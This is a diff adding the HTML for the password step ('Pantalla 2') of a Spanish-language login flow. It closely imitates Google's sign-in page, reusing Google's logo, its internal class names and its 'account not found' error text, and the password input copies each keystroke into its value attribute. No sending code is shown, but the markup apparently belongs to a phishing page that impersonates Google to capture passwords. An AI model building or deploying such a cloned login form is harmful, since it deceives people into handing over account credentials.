@@ -1,0 +1,72 @@
+   <!-- Pantalla 2: Password -->
+   <div id="overlay" class="overlay-desactive"></div>
+   <div id="screen2" class="login-container">
+    <!-- Barra de progreso (loader) -->
+    <div class="bar-desactive"><div></div></div>
+    <!-- Logo -->
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 48" aria-hidden="true">
+        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+      </svg>
+    </div>
+    <!-- Contenedor principal de dos columnas -->
+    <h1 class="title-password">Te damos la bienvenida</h1>
+    <div class="section-container">
+      <!-- Sección izquierda: Email (clicable para volver a modificar) -->
+      <div class="left-section">
+        <div>
+        </div>
+        <div class="email-box" id="emailBox">
+          <svg aria-hidden="true" fill="currentColor" viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+          </svg>
+          <span class="email-text">carlos@gmail.com</span>
+          <svg aria-hidden="true" fill="currentColor" width="24px" height="24px" viewBox="0 0 24 24">
+            <path d="M7 10l5 5 5-5z"></path>
+          </svg>
+        </div>
+      </div>
+      <!-- Sección derecha: Formulario de contraseña -->
+      <div class="right-section">
+        <div class="input-group">
+          <div class="inputBox login-input-password">
+            <input
+              type="password"
+              name="password"
+              id="passwordInput"
+              required
+              onkeyup="this.setAttribute('value', this.value);"
+              value=""
+              class="login-input"
+              placeholder="Ingrese su contraseña"
+            />
+            <label>Ingresa tu contraseña</label>
+          </div>
+        </div>
+
+        <div class="error-message-desactive" >
+          <span class="AfGCob" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" 
+                 width="16px" height="16px" viewBox="0 0 24 24" 
+                 xmlns="https://www.w3.org/2000/svg">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+            </svg>
+          </span>
+          <span style="line-height: 1.2; padding-top:2px;">No pudimos encontrar tu cuenta de Google</span> 
+        </div>
+
+        
+        <div class="checkbox-container">
+          <input type="checkbox" id="showPassword"" />
+          <label for="showPassword">Mostrar contraseña</label>
+        </div>
+        <div class="button-row button-row-password">
+          <a href="#" class="forgot-link forgot-link-password">¿Olvidaste la contraseña?</a>
+          <button class="btn next-btn" id="nextBtnScreen2">Siguiente</button>
+        </div>
+      </div> <!-- Fin right-section -->
+    </div> <!-- Fin section-container -->
+  </div> <!-- Fin screen2 -->
